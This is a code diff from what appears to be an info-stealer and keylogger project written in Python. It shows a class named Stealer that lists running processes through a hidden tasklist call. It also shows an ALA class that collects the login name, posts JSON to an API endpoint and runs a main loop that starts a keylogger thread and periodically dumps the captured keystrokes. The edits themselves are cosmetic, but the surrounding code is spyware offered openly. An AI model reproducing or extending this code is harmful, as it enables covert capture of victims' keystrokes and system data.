@@ -170,9 +170,9 @@ class Stealer:
             output = subprocess.check_output(
 
                 ["tasklist", "/fo", "csv", "/nh"],
-                text=True,
-                encoding="cp850",
-                creationflags=subprocess.CREATE_NO_WINDOW
+                text = True,
+                encoding = "cp850",
+                creationflags = subprocess.CREATE_NO_WINDOW
             )
 
             
@@ -223,12 +223,14 @@ class Stealer:
 #//                                                                                        
 class ALA:
 
+    #agl ____init____
     def __init__(self):
 
         self.url = "http://localhost:8000/api"
         self.header = {"Content-Type": "application/json"}
         self.login_name = os.getlogin()
 
+    #agl ____json_method____
     def process_json(self, command: str, data: Any) -> tuple: #! insert values into json
 
         json = {
@@ -255,6 +257,7 @@ class ALA:
 
         return json
     
+    #agl ____api_methods___
     async def post_request(self): #! example of post request
 
         async with aiohttp.ClientSession() as session:
@@ -303,6 +306,7 @@ class ALA:
 
                 return None
 
+    #agl ____Start____
     async def ala(self): #! Mainloop
 
         keylogger_thread = threading.Thread(target = keylogger.start, daemon = True)
@@ -335,7 +339,7 @@ class ALA:
 
             time_counter += 1
 
-            if (time_counter % 5) == 0:
+            if not time_counter % 5:
 
                 time_counter = 0
 
@@ -343,9 +347,7 @@ class ALA:
                 print(keylogger.get_built_data())
                 keylogger.clear_data()
 
-
-
-    def run(self): #! Run
+    def run(self): #! Run Mainloop
 
         asyncio.run(self.ala())
 
